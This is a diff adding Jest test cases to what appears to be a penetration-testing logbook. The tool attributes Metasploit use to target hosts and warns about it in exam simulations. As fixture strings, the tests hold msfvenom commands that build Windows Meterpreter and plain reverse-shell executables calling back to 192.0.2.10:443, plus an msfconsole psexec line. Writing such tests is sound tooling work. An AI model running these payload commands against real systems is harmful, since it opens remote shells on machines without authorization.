@@ -128,6 +128,20 @@ describe('metasploit attribution and warning', () => {
     expect(metasploitWarning(e, engagement(), ['ms02'])).toBeNull();
   });
 
+  it('a logged Meterpreter payload counts for the target it was logged against, not the Kali it ran on', () => {
+    const met = entry('msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.0.2.10 LPORT=443 -f exe -o met.exe',
+      { payloadId: 'msf-win-x64-met-staged', ranOn: 'Kali', hostIds: ['ms02', 'gone'] });
+    expect(metasploitHostIds(met, engagement(), [ms01, ms02])).toEqual(['ms02']);
+    expect(metasploitWarning(met, engagement({ msfHostId: 'ms01' }), ['ms02'])).toMatch(/Metasploit/);
+  });
+
+  it('a logged non-Meterpreter payload is not Metasploit use', () => {
+    const shell = entry('msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.0.2.10 LPORT=443 -f exe -o rev.exe',
+      { payloadId: 'msf-win-x64-exe', hostIds: ['ms02'] });
+    expect(metasploitHostIds(shell, engagement(), [ms01, ms02])).toEqual([]);
+    expect(isMetasploitLine('msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.0.2.10 -f exe')).toBe(false);
+  });
+
   it('no warning outside exam sims', () => {
     const e = entry('msfconsole -x "use exploit/windows/smb/psexec"');
     for (const kind of ['lab', 'client'] as const) {
